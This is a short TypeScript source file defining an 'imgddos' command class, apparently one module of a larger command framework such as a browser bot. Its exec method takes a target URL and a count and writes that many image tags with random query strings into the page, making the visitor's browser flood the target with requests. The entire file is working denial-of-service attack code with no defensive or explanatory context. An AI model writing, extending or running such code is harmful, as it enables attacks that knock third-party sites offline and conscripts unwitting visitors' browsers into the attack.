import {Command} from "../Command";

export class CommandImgDDoS extends Command {
    
    getCommand(): string {
        return "imgddos";
    }    
    
    exec(args: string): void {
        let arr = args.split(",");
        if(arr.length < 1){
            return;
        }
        let url = arr[0];
        let packets = parseInt(arr[1]);
        for (let i = 0; i < packets; i++) {
            document.write('<img src="'+ url + '?' +  Math.random() + '" />');
        }
    }


}